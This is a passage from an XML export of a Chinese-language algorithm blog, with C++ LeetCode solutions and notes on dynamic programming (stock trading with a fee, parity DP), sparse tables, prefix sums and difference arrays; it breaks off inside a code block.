<h4 id="11-1-1-4-714-买卖股票的最佳时机含手续费">11.1.1.4 <a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/">714. 买卖股票的最佳时机含手续费</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices, <span class="type">int</span> fee)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">buy</span><span class="params">(n,INT_MIN)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sell</span><span class="params">(n)</span></span>;</span><br><span class="line"></span><br><span class="line">        buy[<span class="number">0</span>]=-prices[<span class="number">0</span>]-fee;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">// 第i天是否买入股票</span></span><br><span class="line">            buy[i]=<span class="built_in">max</span>(buy[i<span class="number">-1</span>],sell[i<span class="number">-1</span>]-prices[i]-fee);</span><br><span class="line">            sell[i]=<span class="built_in">max</span>(sell[i<span class="number">-1</span>],buy[i]+prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell[n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices, <span class="type">int</span> fee)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> buy=-prices[<span class="number">0</span>]-fee;</span><br><span class="line">        <span class="type">int</span> sell=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">// 第i天是否买入股票</span></span><br><span class="line">            buy=<span class="built_in">max</span>(buy,sell-prices[i]-fee);</span><br><span class="line">            sell=<span class="built_in">max</span>(sell,buy+prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;prices, <span class="type">int</span> fee)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">buy</span><span class="params">(n, INT_MIN)</span>, <span class="title">sell</span><span class="params">(n, INT_MIN)</span></span>;</span><br><span class="line">        buy[<span class="number">0</span>] = -prices[<span class="number">0</span>] - fee;</span><br><span class="line">        sell[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//以第i天结尾的最大收益，到第i天的最大收益</span></span><br><span class="line">        <span class="comment">// int ans = 0;</span></span><br><span class="line">        <span class="comment">// for (int i = 0; i &lt; n; i++) &#123;</span></span><br><span class="line">        <span class="comment">//     for (int j = 0; j &lt; i; j++) &#123;</span></span><br><span class="line">        <span class="comment">//         buy[i] = max(buy[i], sell[j] - prices[i] - fee);</span></span><br><span class="line">        <span class="comment">//         sell[i] = max(sell[i], buy[j] + prices[i]);</span></span><br><span class="line">        <span class="comment">//         ans = max(ans, sell[i]);</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            buy[i] = <span class="built_in">max</span>(buy[i - <span class="number">1</span>], sell[i - <span class="number">1</span>] - prices[i] - fee);</span><br><span class="line">            sell[i] = <span class="built_in">max</span>(sell[i - <span class="number">1</span>], buy[i - <span class="number">1</span>] + prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell[n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox8"><label for="checkbox8">#### </label><a href="https://leetcode.cn/problems/maximum-alternating-subsequence-sum/">1911. 最大子序列交替和</a></p>
</li>
</ul>
<h1>12 奇偶DP</h1>
<h4 id="12-1-1-1-2786-访问数组中的位置使分数最大">12.1.1.1 <a href="https://leetcode.cn/problems/visit-array-positions-to-maximize-score/">2786. 访问数组中的位置使分数最大</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution2</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maxScore</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(n)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] % <span class="number">2</span> == nums[j] % <span class="number">2</span>)</span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i], dp[j] + nums[i]);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i], dp[j] + nums[i] - x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">max_element</span>(dp.<span class="built_in">begin</span>(), dp.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maxScore</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(n,LLONG_MIN)</span></span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; mark=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">        dp[<span class="number">0</span>]=nums[<span class="number">0</span>];</span><br><span class="line">        mark[nums[<span class="number">0</span>]%<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="type">int</span> num=nums[i];</span><br><span class="line">            <span class="keyword">if</span>(mark[<span class="number">0</span>]!=<span class="number">-1</span>)</span><br><span class="line">                dp[i]=<span class="built_in">max</span>(dp[i],dp[mark[<span class="number">0</span>]]+nums[i]-(num%<span class="number">2</span>==<span class="number">0</span>?<span class="number">0</span>:x));</span><br><span class="line">            <span class="keyword">if</span>(mark[<span class="number">1</span>]!=<span class="number">-1</span>)</span><br><span class="line">                dp[i]=<span class="built_in">max</span>(dp[i],dp[mark[<span class="number">1</span>]]+nums[i]-(num%<span class="number">2</span>==<span class="number">1</span>?<span class="number">0</span>:x));</span><br><span class="line">            mark[num%<span class="number">2</span>]=i;</span><br><span class="line">            ans=<span class="built_in">max</span>(ans,dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>不能将odd和even初始化为0，因为nums[0]是初始状态</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maxScore</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> odd=INT_MIN,even=INT_MIN;</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>]%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">            even=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            odd=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                even=<span class="built_in">max</span>(odd+nums[i]-x,even+nums[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                odd=<span class="built_in">max</span>(odd+nums[i],even+nums[i]-x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(odd,even);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maxScore</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 f[a_0 % 2]</span></span><br><span class="line">        <span class="type">const</span> <span class="type">long</span> <span class="type">long</span> INF = <span class="number">1e18</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> f[<span class="number">2</span>];</span><br><span class="line">        f[<span class="number">0</span>] = f[<span class="number">1</span>] = -INF;</span><br><span class="line">        f[nums[<span class="number">0</span>] % <span class="number">2</span>] = nums[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从左到右枚举访问的终点</span></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="comment">// 套用 dp 方程</span></span><br><span class="line">            <span class="type">int</span> p = nums[i] % <span class="number">2</span>;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> t = <span class="built_in">max</span>(f[p] + nums[i], f[p ^ <span class="number">1</span>] + nums[i] - x);</span><br><span class="line">            f[p] = <span class="built_in">max</span>(f[p], t);</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>13 题目</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox9" checked="true"><label for="checkbox9">#### </label><a href="https://leetcode.cn/problems/house-robber/">198. 打家劫舍</a></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox10" checked="true"><label for="checkbox10">#### </label><a href="https://leetcode.cn/problems/house-robber-ii/">213. 打家劫舍 II</a>（环形数组，考虑首尾连接情况）</p>
</li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>区间查询：ST表</title>
    <url>/2023/07/27/%E7%AE%97%E6%B3%95/%E5%8C%BA%E9%97%B4%EF%BC%9AST%E8%A1%A8/</url>
    <content><![CDATA[<h1>ST表</h1>
<p>离散表（Sparse Table，ST），主要用来解决最大值/最小值查询(Range Minimum/Maximum Query，RMQ)，可以快速的查询区间内的最大值最小值。<code>lookup[i][j]表示从下标i开始长度为</code>$2^j$<code>的区间的最小值</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202307270950867.webp" alt="img"></p>
<p>区间<code>[i,j]</code>长度为<code>L=j-i+1</code>，得到<code>k</code>使得$2<sup>k&lt;=L并且2</sup>{k+1}&gt;L$，考虑两个子区间$[i,i+2<sup>k-1]$和$[j-2</sup>k+1,j]$，两个区间的长度为$2<sup>k$，这两个区间重叠。则$min(i,j)=min(lookup[i][k],lookup[j-2</sup>k+1][k])$。</p>
<p>计算<code>lookup</code>，$lookup[i][j]=min(lookup[i][j-1],lookup[i+2<sup>{j-1}][j-1])$，将长度为$2</sup>j$的区间分为长度为$2^{j-1}$的两个区间。<br>
$$<br>
计算lookup需要O(nlogn)的时间和空间复杂度\<br>
查询O(1)复杂度<br>
$$</p>
<blockquote>
<p>适用于数组不变、多次查询</p>
</blockquote>
<p>其实ST表不仅能处理最大值/最小值，凡是符合<strong>结合律</strong>且<strong>可重复贡献</strong>的信息查询都可以使用ST表高效进行。什么叫可重复贡献呢？设有一个二元运算$f(x,y)$，满足 $f(a,a)=a$，则$f$是可重复贡献的。显然最大值、最小值、最大公因数、最小公倍数、按位或、按位与都符合这个条件。可重复贡献的意义在于，可以对两个交集不为空的区间进行信息合并。</p>
<h4 id="2762-不间断子数组"><a href="https://leetcode.cn/problems/continuous-subarrays/">2762. 不间断子数组</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">continuousSubarrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = <span class="built_in">log2</span>(n);</span><br><span class="line"></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dpMin</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>)),</span><br><span class="line">            <span class="built_in">dpMax</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 初始化</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dpMin[i][<span class="number">0</span>] = nums[i];</span><br><span class="line">            dpMax[i][<span class="number">0</span>] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; (<span class="number">1</span> &lt;&lt; j) &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i + (<span class="number">1</span> &lt;&lt; j) &lt;= n; i++) &#123;</span><br><span class="line">                dpMin[i][j] =</span><br><span class="line">                    <span class="built_in">min</span>(dpMin[i][j - <span class="number">1</span>], dpMin[i + (<span class="number">1</span> &lt;&lt; (j - <span class="number">1</span>))][j - <span class="number">1</span>]);</span><br><span class="line">                dpMax[i][j] =</span><br><span class="line">                    <span class="built_in">max</span>(dpMax[i][j - <span class="number">1</span>], dpMax[i + (<span class="number">1</span> &lt;&lt; (j - <span class="number">1</span>))][j - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> right = <span class="number">0</span>; right &lt; n; right++) &#123;</span><br><span class="line">            <span class="type">int</span> k = <span class="built_in">log2</span>(right - left + <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> mn = <span class="built_in">min</span>(dpMin[left][k], dpMin[right - (<span class="number">1</span> &lt;&lt; k) + <span class="number">1</span>][k]);</span><br><span class="line">            <span class="type">int</span> mx = <span class="built_in">max</span>(dpMax[left][k], dpMax[right - (<span class="number">1</span> &lt;&lt; k) + <span class="number">1</span>][k]);</span><br><span class="line">            <span class="comment">// 最大值和最小值的差值&gt;2</span></span><br><span class="line">            <span class="keyword">while</span> (mx - mn &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                left++;</span><br><span class="line">                k = <span class="built_in">log2</span>(right - left + <span class="number">1</span>);</span><br><span class="line">                mn = <span class="built_in">min</span>(dpMin[left][k], dpMin[right - (<span class="number">1</span> &lt;&lt; k) + <span class="number">1</span>][k]);</span><br><span class="line">                mx = <span class="built_in">max</span>(dpMax[left][k], dpMax[right - (<span class="number">1</span> &lt;&lt; k) + <span class="number">1</span>][k]);</span><br><span class="line">            &#125;</span><br><span class="line">            ans += (right - left + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="https://www.jianshu.com/p/f7d66ea6577e">数组连续区间的最大最小值查询 - 简书 (jianshu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/105439034">算法学习笔记(12): ST表 - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/qq_29495615/article/details/129521626">思维提升|leetcode]6种算法解决LeetCode困难题：滑动窗口最大值_leetcode st表_ErikTse_的博客-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/soul-maker/p/soul_maker1.html">ST表算法详解 - soul_maker - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/m0_50945504/article/details/120070372">(78条消息) ST表详解(稀疏表)_C+G的博客-CSDN博客</a>（题目）</p>
]]></content>
  </entry>
  <entry>
    <title>动态规划：树形DP</title>
    <url>/2024/06/30/%E7%AE%97%E6%B3%95/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%EF%BC%9A%E6%A0%91%E5%BD%A2DP/</url>
    <content><![CDATA[<h1>1 树的直径</h1>
<p><a href="https://leetcode.cn/problems/find-minimum-diameter-after-merging-two-trees/description/">100318. 合并两棵树后的最小直径 - 力扣（LeetCode）</a></p>
<h1>2 参考</h1>
<p><a href="https://www.bilibili.com/video/BV17o4y187h1/?vd_source=5427cf02c00273188250be648b53eced">树形 DP：树的直径【基础算法精讲 23】_哔哩哔哩_bilibili</a><br>
<a href="https://leetcode.cn/problems/jC7MId/description/">LCR 051. 二叉树中的最大路径和 - 力扣（LeetCode）</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/07/10/%E7%AE%97%E6%B3%95/%E5%8C%BA%E9%97%B4%EF%BC%9A%E5%89%8D%E7%BC%80%E5%92%8C%E3%80%81%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h1>1 差分数组、前缀和</h1>
<blockquote>
<p>差分数组是与前缀和数组所对应的一种逆操作，类似于求导和积分，也就是说，<strong>对差分数组求前缀和，可以得到原数组，同样的，对前缀和数组求差分，也可以得到原数组。</strong><br>
差分数组适用于频繁对数组区间进行增减操作，通过求前缀和得到最终数组每一元素的值。但是不适用求区间和。</p>
</blockquote>
<p><a href="https://leetcode.cn/circle/article/P92uug/">前缀和、差分、树状数组、块状数组 - 力扣（LeetCode）</a></p>
<h1>2 前缀和</h1>
<p><a href="https://leetcode.cn/problems/contiguous-array/solutions/809683/lian-xu-shu-zu-by-leetcode-solution-mvnm/">525. 连续数组</a><br>
$$<br>
nums[L:R]=\frac{R+1-L}{2}\<br>
s[R+1]-S[L]=\frac{R+1-L}{2}\<br>
2<em>s[R+1]-R=2</em>s[L]-(L-1)<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMaxLength</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">s</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pos;        <span class="comment">//哈希表记录和第一次出现的位置</span></span><br><span class="line">        pos[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">            s[i + <span class="number">1</span>] = s[i] + nums[i];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(pos.<span class="built_in">count</span>(<span class="number">2</span>*s[i<span class="number">+1</span>]-i))&#123;</span><br><span class="line">                <span class="type">int</span> diff = i + <span class="number">1</span> - pos[<span class="number">2</span> * s[i + <span class="number">1</span>] - i];</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, diff);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pos[<span class="number">2</span> * s[i + <span class="number">1</span>] - i] = i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>$$<br>
0和1数量相同\rightarrow 1的数量-0的数量=0<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMaxLength</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">s</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pos;        <span class="comment">//哈希表记录和第一次出现的位置</span></span><br><span class="line">        pos[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">            s[i + <span class="number">1</span>] = s[i] + (nums[i] == <span class="number">1</span> ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(pos.<span class="built_in">count</span>(s[i<span class="number">+1</span>]))&#123;</span><br><span class="line">                <span class="type">int</span> diff = i + <span class="number">1</span> - pos[s[i + <span class="number">1</span>]];</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, diff);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pos[s[i + <span class="number">1</span>]] = i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>3 差分数组</h1>
<blockquote>
<p>差分数组对应的概念是前缀和数组，d[i]=nums[i]-nums[i-1]，d[0]=nums[0]，对差分数组求前缀和可得到原数组。</p>
<p>对原数组的区间[l,r]增加x时，差分数组对应的改变为：d[l]增加x，d[r+1]减少x。</p>
<p>d[r+1]=nums[r+1]-nums[r]，其中nums[r]增加x。</p>
<p>这种修改是可以叠加的，即当我们多次对原数组的不同区间施加不同的增量，我们只要按规则修改差分数组即可。</p>
<p>可以理解为公交车问题，在l站上车，乘坐区间[l,r]，在[r+1]站下车。</p>
<p>特别地，当 r 为 n 时，我们无需修改 d[r]，因为这个位置溢出了下标范围。如果求前缀和时考虑该位置，那么该位置对应的前缀和值必定为 0。读者们可以自行思考原因，以加深对差分数组的理解。</p>
</blockquote>
<h4 id="6919-使数组中的所有元素都等于零"><a href="https://leetcode.cn/problems/apply-operations-to-make-all-array-elements-equal-to-zero/">6919. 使数组中的所有元素都等于零</a></h4>
<p><a href="https://www.bilibili.com/video/BV1XW4y1f7Wv/?spm_id_from=333.788&amp;vd_source=5427cf02c00273188250be648b53eced">把子数组改成子序列要怎么做？【力扣周赛 353】_哔哩哔哩_bilibili</a></p>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202307101555389.png" alt="Leetcode-动态规划DP-差分数组   6919. 使数组中的所有元素都等于零.png" style="zoom: 25%;" />
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">d</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">// d[0] = nums[0];</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> sum_d = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">            sum_d += d[i];</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> x = sum_d+nums[i];</span><br><span class="line">            <span class="keyword">if</span>(x==<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(x&lt;<span class="number">0</span>||i+k&gt;n)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            sum_d -= x;</span><br><span class="line">            d[i + k] += x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>方法二</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> K)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// 计算差分数组</span></span><br><span class="line">        <span class="type">int</span> f[n + <span class="number">1</span>];</span><br><span class="line">        f[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) f[i] = nums[i] - nums[i - <span class="number">1</span>];</span><br><span class="line">        f[n] = -nums[n - <span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 从左到右对差分数组里的每个元素进行操作</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i + K &lt;= n; i++) <span class="keyword">if</span> (f[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            f[i + K] += f[i];</span><br><span class="line">            f[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检查差分数组中是否所有元素均为 0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) <span class="keyword">if</span> (f[i] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span 